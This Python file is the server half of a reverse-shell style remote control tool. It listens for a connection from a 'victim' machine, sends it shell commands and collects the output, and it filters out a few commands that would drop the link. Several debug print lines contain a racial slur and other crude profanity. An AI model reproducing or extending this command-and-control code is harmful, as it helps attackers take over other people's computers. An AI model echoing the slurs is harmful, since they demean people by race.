import socket

conEST = False

def listen(ip: str, port: int, connectionLimit, q):
    #try:
        global conEST
        if connectionLimit != int:
            connectionLimit = 1
        print(port)
        server = socket.socket()
        #server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, 10)
        server.bind((ip, port))
        server.listen(connectionLimit)
        victim, victim_address = server.accept()
        conEST = True
        print('fart munke')
        q.put((victim, victim_address))
    #except Exception as e:
       # print(e)


def sendCommand(command: str, q, commandQ, errorQ):
    try:
        if conEST == True:
            print("hfdsiafadf ngiger")
            victim, victim_address = q.get()
            q.put((victim, victim_address))
            print("shit")
            customOutput = ''
            if len(command) < 1:
                customOutput = "Command cannot be null"
                command = 'cd'
            if command == 'say' or command == 'python' or command == 'python3':
                customOutput = 'Command cancelled because the written command breaks connection.'
                command = 'cd'

            print("shitting nigger")
            victim.send(command.encode())
            print("nigger")
            output = victim.recv(1000000000).decode()
            commandQ.put((output))
            errorQ.put((customOutput))
        else:
            customOutput = 'Command Cannot be sent because there is no active connection with victim.'
            commandQ.put((customOutput))
    except Exception as ex:
        if type(ex) == AttributeError:
            print("No victim is connected")
        print(ex)
